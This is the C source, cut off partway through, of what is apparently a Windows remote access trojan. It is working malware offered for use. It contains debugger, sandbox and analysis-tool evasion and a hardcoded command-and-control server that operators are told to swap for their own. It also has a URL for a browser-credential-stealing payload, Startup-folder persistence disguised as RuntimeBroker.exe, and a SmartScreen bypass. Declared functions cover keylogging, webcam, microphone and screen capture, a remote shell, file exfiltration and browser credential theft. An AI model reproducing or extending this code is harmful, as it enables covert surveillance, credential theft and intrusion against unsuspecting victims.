#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <ws2tcpip.h>
#include <direct.h>
#include <shlobj.h>
#include <vfw.h>
#include <mmsystem.h>
#include <intrin.h>
#include <wincrypt.h>
#include <bcrypt.h>

// Define BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO if not available (MinGW compatibility)
#ifndef BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION
#define BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION 1

typedef struct _BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO {
    ULONG cbSize;
    ULONG dwInfoVersion;
    PUCHAR pbNonce;
    ULONG cbNonce;
    PUCHAR pbAuthData;
    ULONG cbAuthData;
    PUCHAR pbTag;
    ULONG cbTag;
    PUCHAR pbMacContext;
    ULONG cbMacContext;
    ULONG cbAAD;
    ULONGLONG cbData;
    ULONG dwFlags;
} BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO, *PBCRYPT_AUTHENTICATED_CIPHER_MODE_INFO;
#endif

// Define BCRYPT_CHAIN_MODE_ECB if not available (MinGW compatibility)
#ifndef BCRYPT_CHAIN_MODE_ECB
#define BCRYPT_CHAIN_MODE_ECB L"ChainingModeECB"
#endif

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "vfw32.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")

#define BUFFER_SIZE 262144  // 256KB for large uploads
#define UPLOAD_BUFFER_SIZE 524288  // 512KB for upload accumulation
#define RECONNECT_DELAY 3000
#define PING_INTERVAL 10000

// ============== ENHANCED AV EVASION ==============

// XOR key for string obfuscation
static const char XOR_KEY = 0x5A;

// Deobfuscate string at runtime
static void xor_decode(char* str, int len) {
    for (int i = 0; i < len; i++) str[i] ^= XOR_KEY;
}

// Check for debugger - multiple methods
static int ev_dbg() {
    // Method 1: IsDebuggerPresent
    if (IsDebuggerPresent()) return 1;
    
    // Method 2: Remote debugger
    BOOL remote = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote);
    if (remote) return 1;
    
    // Method 3: Hardware breakpoint check
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (GetThreadContext(GetCurrentThread(), &ctx)) {
        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) return 1;
    }
    
    // Method 4: Timing check
    LARGE_INTEGER start, end, freq;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    Sleep(1);
    QueryPerformanceCounter(&end);
    double elapsed = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart * 1000;
    if (elapsed > 50) return 1;  // Debugger likely stepping through
    
    return 0;
}

// Check for VM/Sandbox indicators
static int ev_vm() {
    // CPU count check
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return 1;
    
    // RAM check (sandboxes often have < 4GB)
    MEMORYSTATUSEX mem;
    mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < 4ULL * 1024 * 1024 * 1024) return 1;
    
    // Screen size check
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    if (w < 1024 || h < 768) return 1;
    
    // Disk size check (VMs often have small disks)
    ULARGE_INTEGER free, total, totalFree;
    if (GetDiskFreeSpaceExA("C:\\", &free, &total, &totalFree)) {
        if (total.QuadPart < 60ULL * 1024 * 1024 * 1024) return 1;  // < 60GB
    }
    
    return 0;
}

// Check for analysis tools by process name
static int ev_tools() {
    // Obfuscated tool names (XOR with 0x5A)
    char tools[][20] = {
        {0x32,0x39,0x2b,0x3b,0x38,0x3e,0x3d,0x3f,0x18,0x3b,0x24,0x3b,0}, // wireshark
        {0x3c,0x3e,0x2b,0x3e,0x36,0x3d,0x18,0x3b,0x24,0x3b,0},           // procmon
        {0x24,0x18,0x3b,0x24,0x3b,0},                                     // x64dbg -> simplified
    };
    
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    int found = 0;
    
    if (Process32First(snap, &pe)) {
        do {
            // Check for common analysis tools
            char* name = pe.szExeFile;
            CharLowerA(name);
            if (strstr(name, "wire") || strstr(name, "fiddler") || 
                strstr(name, "procmon") || strstr(name, "procexp") ||
                strstr(name, "dbg") || strstr(name, "olly") ||
                strstr(name, "ida") || strstr(name, "x32") || strstr(name, "x64") ||
                strstr(name, "ghidra") || strstr(name, "pestudio") ||
                strstr(name, "hiew") || strstr(name, "detect")) {
                found = 1;
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}

// Check for user activity (sandboxes have no real users)
static int ev_user() {
    // Check cursor movement
    POINT p1, p2;
    GetCursorPos(&p1);
    Sleep(500);
    GetCursorPos(&p2);
    if (p1.x == p2.x && p1.y == p2.y) {
        // Cursor didn't move - might be sandbox, but check more
        LASTINPUTINFO lii;
        lii.cbSize = sizeof(lii);
        GetLastInputInfo(&lii);
        DWORD idle = GetTickCount() - lii.dwTime;
        if (idle > 600000) return 1;  // No input for 10 min = suspicious
    }
    return 0;
}

// Check for VM registry keys and files
static int ev_vm_artifacts() {
    // Check VM-related registry keys
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\VMware, Inc.\\VMware Tools", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        // Don't exit - VMware is common, just note it
    }
    
    // Check for VM files
    if (GetFileAttributesA("C:\\windows\\system32\\drivers\\vmmouse.sys") != INVALID_FILE_ATTRIBUTES) {
        // VMware detected but continue
    }
    
    return 0;  // Don't block VMs, many targets use VMs
}

// Main evasion check - returns 1 if should abort
static int perform_evasion_checks() {
    // Random startup delay (1-5 seconds)
    srand(GetTickCount());
    Sleep(1000 + (rand() % 4000));
    
    // Check for debuggers (critical)
    if (ev_dbg()) {
        Sleep(10000 + (rand() % 5000));  // Long delay to frustrate analysis
        return 1;
    }
    
    // Check for analysis tools (critical)
    if (ev_tools()) {
        Sleep(8000 + (rand() % 5000));
        return 1;
    }
    
    // VM/sandbox checks (less critical - many real users use VMs)
    if (ev_vm()) {
        Sleep(5000);  // Delay but don't abort
    }
    
    // User activity check
    ev_user();
    
    return 0;
}

// ============== DECOY CODE ==============
// Fake legitimate-looking functions to confuse static analysis

static DWORD WINAPI decoy_update_thread(LPVOID p) {
    // Looks like update checker
    Sleep(INFINITE);
    return 0;
}

static void run_decoy_init() {
    // Create decoy thread
    CreateThread(NULL, 0, decoy_update_thread, NULL, 0, NULL);
    
    // Access some legitimate APIs
    DWORD version = GetVersion();
    SYSTEMTIME st;
    GetLocalTime(&st);
    (void)version;
}

// WebSocket configuration - CHANGE THESE TO YOUR SERVER
char g_server_host[256] = "api.root1.me";
char g_server_port[6] = "80";
char g_server_path[256] = "/";
// ChromElevator URL for browser credential extraction
char g_chromelevator_url[512] = "https://github.com/adhikarisubodh9991/sub6-windows-payload/raw/refs/heads/main/files/chromelevator.exe";

// Global variables
SOCKET g_sock = INVALID_SOCKET;
char g_computer_name[MAX_COMPUTERNAME_LENGTH + 1];
char g_username[256];
char g_client_id[64];  // Unique client identifier (persisted)
char g_current_dir[MAX_PATH];
volatile int g_connected = 0;
volatile int g_should_exit = 0;
volatile int g_reset_recv_buffer = 0;
int g_session_id = 0;
DWORD g_last_ping_time = 0;

// Upload state for receiving files from server
static int g_upload_in_progress = 0;
static char g_upload_filename[MAX_PATH];
static FILE* g_upload_file = NULL;
static long g_upload_received = 0;
static long g_upload_expected_size = 0;

// Upload accumulation buffer for fragmented WebSocket messages
static char* g_upload_buffer = NULL;
static int g_upload_buffer_len = 0;
static int g_upload_buffer_capacity = 0;

// Input monitor state (obfuscated name)
static HANDLE g_input_mon_thread = NULL;
static volatile int g_input_mon_running = 0;
static char g_input_log_path[MAX_PATH];

// Ping thread state
static HANDLE g_ping_thread = NULL;
static volatile int g_ping_running = 0;

// Live view state
static HANDLE g_liveview_thread = NULL;
static volatile int g_liveview_running = 0;
static int g_liveview_fps = 30;  // Default 30 FPS for smooth streaming
static int g_liveview_quality = 80;  // JPEG quality percentage (higher = better)
static int g_liveview_scale = 1;  // 1 = full resolution, 2 = half, etc.
static volatile int g_liveview_recording = 0;  // Recording flag
static char g_liveview_record_path[MAX_PATH];  // Recording output path
static FILE* g_liveview_record_file = NULL;  // Recording file handle
static DWORD g_liveview_record_frames = 0;  // Frame counter for recording

// Camera/Webcam state
static HWND g_cam_hwnd = NULL;
static HANDLE g_camview_thread = NULL;
static volatile int g_camview_running = 0;
static int g_camview_fps = 30;  // Default 30 FPS for smooth streaming
static int g_camview_quality = 80;  // JPEG quality for camera
static int g_cam_width = 640;
static int g_cam_height = 480;
static int g_current_camera = 0;      // Current camera index
static int g_num_cameras = 0;         // Number of available cameras
static volatile int g_camview_recording = 0;  // Camera recording flag
static FILE* g_camview_record_file = NULL;

// Audio recording state
static volatile int g_recording = 0;
static HANDLE g_recording_thread = NULL;
static char g_recording_file[MAX_PATH];

// Live audio streaming state
static HANDLE g_liveaudio_thread = NULL;
static volatile int g_liveaudio_running = 0;
static HWAVEIN g_liveaudio_hwavein = NULL;
static int g_liveaudio_samplerate = 22050;
static int g_liveaudio_channels = 1;

// Frame capture state (for callback-based capture like Metasploit)
static BYTE* g_frame_buffer = NULL;
static int g_frame_size = 0;
static volatile int g_frame_ready = 0;
static CRITICAL_SECTION g_frame_cs;
static int g_frame_cs_init = 0;

// Audio recording state
static volatile int g_audio_recording = 0;

// Screen recording state
static volatile int g_screenrecord_running = 0;
static HANDLE g_screenrecord_thread = NULL;
static char g_screenrecord_path[MAX_PATH];
static int g_screenrecord_fps = 5;  // Low FPS for small file size
static int g_screenrecord_bitrate = 500000;  // 500 Kbps for small files
static char g_screenrecord_state_file[MAX_PATH];  // Persist recording state across restarts
static volatile int g_screenrecord_paused_for_liveview = 0;  // Track if recording was paused for liveview
static volatile int g_screenrecord_enabled = 0;  // Track if recording should auto-start (0 = disabled)
static HANDLE g_screenrecord_process = NULL;  // Handle to ffmpeg/powershell process for proper termination

// Function declarations
void stealth_mode();
int connect_websocket();
int send_websocket_data(const char* data, int len);
int recv_websocket_data(char* buffer, int max_len);
void handle_session();
void cleanup_socket();
void base64_encode(const unsigned char* input, int length, char* output);
void generate_websocket_key(char* key);
int websocket_handshake();
void create_websocket_frame(const char* data, int len, unsigned char* frame, int* frame_len);
int parse_websocket_frame(unsigned char* data, int len, char* output, int* output_len);
void send_websocket_ping();
void take_screenshot();
void shell_session();
void list_processes();
void download_file(const char* filename);
void download_folder(const char* foldername);
void execute_command(const char* cmd);
void change_directory(const char* path);
void handle_command(const char* cmd);
int handle_upload_data(char* data, int len);
void start_input_monitor();
void stop_input_monitor();
void enable_persistence();
void disable_persistence();
DWORD WINAPI input_monitor_thread(LPVOID param);
DWORD WINAPI ping_thread(LPVOID param);
void start_liveview(int fps, int quality);
void stop_liveview();
DWORD WINAPI liveview_thread(LPVOID param);
void start_camview(int fps, int quality);
void stop_camview();
DWORD WINAPI camview_thread(LPVOID param);
void take_camshot();
HWND init_camera(int camera_index);
void close_camera();
int capture_camera_frame(BYTE** out_data, int* out_width, int* out_height);
void record_audio(int seconds);
void list_cameras();
void select_camera(int index);
void start_liveaudio(int samplerate);
void stop_liveaudio();
DWORD WINAPI liveaudio_thread(LPVOID param);
void mouse_move(int x, int y);
void mouse_click(int button);
void send_keys(const char* keys);
void extract_browser_creds();
void start_screenrecord();
void start_screenrecord_internal();
void stop_screenrecord();
void download_screenrecord();
void delete_screenrecord();
DWORD WINAPI screenrecord_thread(LPVOID param);
DWORD WINAPI power_monitor_thread(LPVOID param);

// Power monitor for sleep/wake detection
static HANDLE g_power_monitor_thread = NULL;
static volatile int g_power_monitor_running = 0;

// Power event monitor thread - restarts recording after wake from sleep
DWORD WINAPI power_monitor_thread(LPVOID param) {
    // Create a hidden window to receive power broadcast messages
    WNDCLASSA wc = {0};
    wc.lpfnWndProc = DefWindowProcA;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = "PowerMonitorClass";
    RegisterClassA(&wc);
    
    HWND hwnd = CreateWindowExA(0, "PowerMonitorClass", "", 0, 0, 0, 0, 0, 
                                 HWND_MESSAGE, NULL, GetModuleHandle(NULL), NULL);
    
    MSG msg;
    while (g_power_monitor_running && GetMessage(&msg, NULL, 0, 0)) {
        if (msg.message == WM_POWERBROADCAST) {
            if (msg.wParam == PBT_APMRESUMEAUTOMATIC || msg.wParam == PBT_APMRESUMESUSPEND) {
                // System woke from sleep - restart recording if enabled
                Sleep(2000);  // Wait for system to stabilize
                if (g_screenrecord_enabled && !g_screenrecord_running) {
                    start_screenrecord_internal();
                }
            }
        }
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    if (hwnd) DestroyWindow(hwnd);
    return 0;
}

// Generate or load unique client ID (persisted in hidden file)
void init_client_id() {
    char appdata_path[MAX_PATH];
    char id_file[MAX_PATH];
    
    // Get AppData\Local path
    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata_path) != S_OK) {
        // Fallback: generate random ID (not persisted)
        sprintf(g_client_id, "%08lX%08lX", GetTickCount(), GetCurrentProcessId());
        return;
    }
    
    // Hidden directory for ID file
    char id_dir[MAX_PATH];
    sprintf(id_dir, "%s\\Microsoft\\Crypto\\Keys", appdata_path);
    CreateDirectoryA(id_dir, NULL);
    
    sprintf(id_file, "%s\\machinekey.dat", id_dir);
    
    // Try to read existing ID
    FILE* f = fopen(id_file, "rb");
    if (f) {
        if (fread(g_client_id, 1, 32, f) >= 16) {
            g_client_id[32] = '\0';
            fclose(f);
            return;
        }
        fclose(f);
    }
    
    // Generate new unique ID (hardware-based + random)
    DWORD vol_serial = 0;
    GetVolumeInformationA("C:\\", NULL, 0, &vol_serial, NULL, NULL, NULL, 0);
    
    // Combine multiple sources for uniqueness
    sprintf(g_client_id, "%08lX%08lX%08lX%04X",
            vol_serial,
            GetTickCount(),
            GetCurrentProcessId(),
            (unsigned int)(rand() & 0xFFFF));
    
    // Save for persistence
    f = fopen(id_file, "wb");
    if (f) {
        fwrite(g_client_id, 1, strlen(g_client_id), f);
        fclose(f);
        // Hide the file
        SetFileAttributesA(id_file, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    }
}

void stealth_mode() {
    HWND hwnd = GetConsoleWindow();
    if (hwnd) {
        ShowWindow(hwnd, SW_HIDE);
    }
}

// Enable persistence using Startup folder (most reliable, no admin needed)
void enable_persistence() {
    char current_exe[MAX_PATH];
    char startup_folder[MAX_PATH];
    char target_dir[MAX_PATH];
    char target_exe[MAX_PATH];
    char shortcut_path[MAX_PATH];
    char vbs_path[MAX_PATH];
    
    GetModuleFileNameA(NULL, current_exe, MAX_PATH);
    
    // Get AppData\Local path for hiding the executable
    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, target_dir) != S_OK) {
        return;
    }
    
    // Create hidden directory
    strcat(target_dir, "\\Microsoft\\RuntimeBroker");
    CreateDirectoryA(target_dir, NULL);
    
    // Target executable path
    sprintf(target_exe, "%s\\RuntimeBroker.exe", target_dir);
    
    // Copy executable if not already there
    if (_stricmp(current_exe, target_exe) != 0) {
        CopyFileA(current_exe, target_exe, FALSE);
        
        // Remove Zone.Identifier (Mark of the Web) to bypass SmartScreen
        // This removes the "downloaded from internet" flag
        char zone_file[MAX_PATH + 20];
        sprintf(zone_file, "%s:Zone.Identifier", target_exe);
        DeleteFileA(zone_file);
        
        // Also try PowerShell method as backup
        STARTUPINFOA si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        ZeroMemory(&pi, sizeof(pi));
        
        char ps_cmd[1024];
        sprintf(ps_cmd, "cmd.exe /c powershell -WindowStyle Hidden -Command \"Unblock-File -Path '%s'\" 2>nul", target_exe);
        if (CreateProcessA(NULL, ps_cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, 3000);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }
    
    // Get Startup folder path
    if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_folder) != S_OK) {
        return;
    }
    
    // Create a VBS script that launches the exe silently (bypasses SmartScreen)
    sprintf(vbs_path, "%s\\RuntimeBroker.vbs", startup_folder);
    FILE* vbs = fopen(vbs_path, "w");
    if (vbs) {
        fprintf(vbs, "Set WshShell = CreateObject(\"WScript.Shell\")\n");
        fprintf(vbs, "WshShell.Run chr(34) & \"%s\" & chr(34), 0, False\n", target_exe);
        fprintf(vbs, "Set WshShell = Nothing\n");
        fclose(vbs);
        
        // Remove Zone.Identifier from VBS file too
        char vbs_zone[MAX_PATH + 20];
        sprintf(vbs_zone, "%s:Zone.Identifier", vbs_path);
        DeleteFileA(vbs_zone);
    }
}

// Disable persistence
void disable_persistence() {
    char startup_folder[MAX_PATH];
    char vbs_path[MAX_PATH];
    char target_dir[MAX_PATH];
    char target_exe[MAX_PATH];
    
    // Get Startup folder and delete VBS
    if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_folder) == S_OK) {
        sprintf(vbs_path, "%s\\RuntimeBroker.vbs", startup_folder);
        DeleteFileA(vbs_path);
    }
    
    // Clean up old registry entries
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, "RuntimeBroker");
        RegDeleteValueA(hKey, "WindowsSecurityService");
        RegCloseKey(hKey);
    }
    
    // Delete old scheduled tasks
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    ZeroMemory(&pi, sizeof(pi));
    
    char cmd[512] = "cmd.exe /c schtasks /delete /tn \"RuntimeBroker\" /f 2>nul & schtasks /delete /tn \"MicrosoftEdgeUpdateTaskMachine\" /f 2>nul";
    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 3000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

static const char base64_chars[] = 
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

void base64_encode(const unsigned char* input, int length, char* output) {
    int i = 0, j = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];
    
    while (length--) {
        char_array_3[i++] = *(input++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;
            
            for(i = 0; i < 4; i++)
                output[j++] = base64_chars[char_array_4[i]];
            i = 0;
        }
    }
    
    if (i) {
        for(int k = i; k < 3; k++)
            char_array_3[k] = '\0';
        
        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        
        for (int k = 0; k < i + 1; k++)
            output[j++] = base64_chars[char_array_4[k]];
        
        while(i++ < 3)
            output[j++] = '=';
    }
    output[j] = '\0';
}

void generate_websocket_key(char* key) {
    unsigned char random_bytes[16];
    srand(time(NULL) ^ GetCurrentProcessId());
    
    for (int i = 0; i < 16; i++) {
        random_bytes[i] = rand() % 256;
    }
    
    base64_encode(random_bytes, 16, key);
}

int websocket_handshake() {
    char key[32];
    char request[1024];
    char response[4096];
    
    generate_websocket_key(key);
    
    sprintf(request,
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        "Sec-WebSocket-Key: %s\r\n"
        "Sec-WebSocket-Version: 13\r\n"
        "User-Agent: Mozilla/5.0\r\n"
        "\r\n",
        g_server_path, g_server_host, key);
    
    if (send(g_sock, request, strlen(request), 0) <= 0) {
        return 0;
    }
    
    int received = recv(g_sock, response, sizeof(response) - 1, 0);
    if (received <= 0) {
        return 0;
    }
    
    response[received] = '\0';
    
    if (strstr(response, "101") == NULL || strstr(response, "Switching Protocols") == NULL) {
        return 0;
    }
    
    return 1;
}

void create_websocket_frame(const char* data, int len, unsigned char* frame, int* frame_len) {
    int pos = 0;
    
    frame[pos++] = 0x81;
    
    if (len < 126) {
        frame[pos++] = 0x80 | len;
    } else if (len < 65536) {
        frame[pos++] = 0x80 | 126;
        frame[pos++] = (len >> 8) & 0xFF;
        frame[pos++] = len & 0xFF;
    } else {
        frame[pos++] = 0x80 | 127;
        for (int i = 7; i >= 0; i--) {
            frame[pos++] = (len >> (i * 8)) & 0xFF;
        }
    }
    
    unsigned char mask[4];
    for (int i = 0; i < 4; i++) {
        mask[i] = rand() % 256;
        frame[pos++] = mask[i];
    }
    
    for (int i = 0; i < len; i++) {
        frame[pos++] = data[i] ^ mask[i % 4];
    }
    
    *frame_len = pos;
}

// Send a websocket ping frame directly (for keepalive thread)
void send_ping_direct() {
    if (!g_connected || g_sock == INVALID_SOCKET) return;
    
    unsigned char ping_frame[6];
    ping_frame[0] = 0x89;  // Ping frame
    ping_frame[1] = 0x80;  // Masked, 0 payload
    
    for (int i = 0; i < 4; i++) {
        ping_frame[2 + i] = rand() % 256;
    }
    
    send(g_sock, (char*)ping_frame, 6, 0);
}

// Ping thread - sends pings every 8 seconds to keep connection alive
DWORD WINAPI ping_thread(LPVOID param) {
    while (g_ping_running && g_connected) {
        Sleep(8000);  // 8 seconds
        if (g_connected && g_sock != INVALID_SOCKET) {
            send_ping_direct();
        }
    }
    return 0;
}

void send_websocket_ping() {
    if (!g_connected || g_sock == INVALID_SOCKET) return;
    
    DWORD current_time = GetTickCount();
    if (current_time - g_last_ping_time < PING_INTERVAL) {
        return;
    }
    
    unsigned char ping_frame[6];
    ping_frame[0] = 0x89;
    ping_frame[1] = 0x80;
    
    for (int i = 0; i < 4; i++) {
        ping_frame[2 + i] = rand() % 256;
    }
    
    send(g_sock, (char*)ping_frame, 6, 0);
    g_last_ping_time = current_time;
}

int parse_websocket_frame(unsigned char* data, int len, char* output, int* output_len) {
    if (len < 2) return 0;
    
    int pos = 0;
    unsigned char opcode = data[pos++] & 0x0F;
    
    if (opcode == 0x08) return -1;
    
    if (opcode == 0x09) {
        int masked = (data[pos] & 0x80) != 0;
        int payload_len = data[pos++] & 0x7F;
        
        if (payload_len == 126) {
            if (len < pos + 2) return 0;
            payload_len = (data[pos] << 8) | data[pos + 1];
            pos += 2;
        }
        
        unsigned char mask[4] = {0};
        if (masked) {
            if (len < pos + 4) return 0;
            for (int i = 0; i < 4; i++) {
                mask[i] = data[pos++];
            }
        }
        
        if (len < pos + payload_len) return 0;
        
        unsigned char ping_payload[125];
        for (int i = 0; i < payload_len && i < 125; i++) {
            ping_payload[i] = masked ? (data[pos + i] ^ mask[i % 4]) : data[pos + i];
        }
        
        unsigned char pong_frame[135];
        int pong_pos = 0;
        
        pong_frame[pong_pos++] = 0x8A;
        pong_frame[pong_pos++] = 0x80 | payload_len;
        
        for (int i = 0; i < 4; i++) {
            pong_frame[pong_pos++] = rand() % 256;
        }
        
        for (int i = 0; i < payload_len; i++) {
            pong_frame[pong_pos++] = ping_payload[i] ^ pong_frame[2 + (i % 4)];
        }
        
        send(g_sock, (char*)pong_frame, pong_pos, 0);
        
        return pos + payload_len;
    }
    
    if (opcode == 0x0A) {
        int masked = (data[pos] & 0x80) != 0;
        int payload_len = data[pos++] & 0x7F;
        
        if (payload_len == 126) {
            if (len < pos + 2) return 0;
            payload_len = (data[pos] << 8) | data[pos + 1];
            pos += 2;
        }
        
        if (masked) {
            if (len < pos + 4) return 0;
            pos += 4;
        }
        
        if (len < pos + payload_len) return 0;
        
        return pos + payload_len;
    }
    
    int masked = (data[pos] & 0x80) != 0;
    int payload_len = data[pos++] & 0x7F;
    
    if (payload_len == 126) {
        if (len < pos + 2) return 0;
        payload_len = (data[pos] << 8) | data[pos + 1];
        pos += 2;
    } else if (payload_len == 127) {
        if (len < pos + 8) return 0;
        payload_len = 0;
        for (int i = 0; i < 8; i++) {
            payload_len = (payload_len << 8) | data[pos++];
        }
    }
    
    unsigned char mask[4] = {0};
    if (masked) {
        if (len < pos + 4) return 0;
        for (int i = 0; i < 4; i++) {
            mask[i] = data[pos++];
        }
    }
    
    if (len < pos + payload_len) return 0;
    
    for (int i = 0; i < payload_len && i < *output_len; i++) {
        output[i] = masked ? (data[pos + i] ^ mask[i % 4]) : data[pos + i];
    }
    
    *output_len = payload_len;
    return pos + payload_len;
}

void cleanup_socket() {
    if (g_sock != INVALID_SOCKET) {
        shutdown(g_sock, SD_BOTH);
        closesocket(g_sock);
        g_sock = INVALID_SOCKET;
    }
    g_connected = 0;
}

int connect_websocket() {
    WSADATA wsa;
    struct addrinfo hints, *result = NULL;
    
    // Signal to reset recv buffer
    g_reset_recv_buffer = 1;
    
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
        return 0;
    }
    
    cleanup_socket();
    
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    
    if (getaddrinfo(g_server_host, g_server_port, &hints, &result) != 0) {
        WSACleanup();
        return 0;
    }
    
    g_sock = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (g_sock == INVALID_SOCKET) {
        freeaddrinfo(result);
        WSACleanup();
        return 0;
    }
    
    // Increase timeouts for Cloudflare compatibility
    DWORD timeout = 60000;  // 60 seconds
    setsockopt(g_sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
    setsockopt(g_sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
    
    // Enable TCP keepalive
    int keepalive = 1;
    setsockopt(g_sock, SOL_SOCKET, SO_KEEPALIVE, (char*)&keepalive, sizeof(keepalive));
    
    // TCP_NODELAY for low latency (disable Nagle's algorithm)
    int flag = 1;
    setsockopt(g_sock, IPPROTO_TCP, TCP_NODELAY, (char*)&flag, sizeof(flag));
    
    // Increase socket buffers for faster streaming
    int send_buf_size = 1024 * 256;  // 256KB send buffer
    int recv_buf_size = 1024 * 256;  // 256KB receive buffer
    setsockopt(g_sock, SOL_SOCKET, SO_SNDBUF, (char*)&send_buf_size, sizeof(send_buf_size));
    setsockopt(g_sock, SOL_SOCKET, SO_RCVBUF, (char*)&recv_buf_size, sizeof(recv_buf_size));
    
    if (connect(g_sock, result->ai_addr, (int)result->ai_addrlen) != 0) {
        freeaddrinfo(result);
        cleanup_socket();
        WSACleanup();
        return 0;
    }
    
    freeaddrinfo(result);
    
    if (!websocket_handshake()) {
        cleanup_socket();
        WSACleanup();
        return 0;
    }
    
    g_connected = 1;
    g_last_ping_time = GetTickCount();
    return 1;
}

int send_websocket_data(const char* data, int len) {
    if (!g_connected || g_sock == INVALID_SOCKET) return 0;
    
    unsigned char* frame = (unsigned char*)malloc(len + 14);
    if (!frame) return 0;
    
    int frame_len;
    create_websocket_frame(data, len, frame, &frame_len);
    
    int total = 0;
    while (total < frame_len) {
        int sent = send(g_sock, (char*)(frame + total), frame_len - total, 0);
        if (sent == SOCKET_ERROR || sent == 0) {
            free(frame);
            g_connected = 0;  // Mark connection as broken
            return 0;
        }
        total += sent;
    }
    
    free(frame);
    return 1;
}

int recv_websocket_data(char* buffer, int max_len) {
    if (!g_connected || g_sock == INVALID_SOCKET) return -1;
    
    static unsigned char recv_buffer[BUFFER_SIZE];
    static int recv_buffer_len = 0;
    
    // Reset buffer if flagged (on reconnection)
    if (g_reset_recv_buffer) {
        recv_buffer_len = 0;
        g_reset_recv_buffer = 0;
    }
    
    fd_set readfds;
    struct timeval tv;
    
    FD_ZERO(&readfds);
    FD_SET(g_sock, &readfds);
    tv.tv_sec = 0;
    tv.tv_usec = 100000;  // 100ms timeout for responsiveness
    
    int activity = select(0, &readfds, NULL, NULL, &tv);
    if (activity <= 0) {
        return 0;
    }
    
    int received = recv(g_sock, (char*)(recv_buffer + recv_buffer_len), 
                       sizeof(recv_buffer) - recv_buffer_len, 0);
    
    if (received <= 0) {
        recv_buffer_len = 0;  // Reset on error
        g_connected = 0;  // Mark connection as broken
        return -1;
    }
    
    recv_buffer_len += received;
    
    int output_len = max_len;
    int consumed = parse_websocket_frame(recv_buffer, recv_buffer_len, buffer, &output_len);
    
    if (consumed < 0) {
        recv_buffer_len = 0;  // Reset on error
        return -1;
    }
    
    if (consumed > 0) {
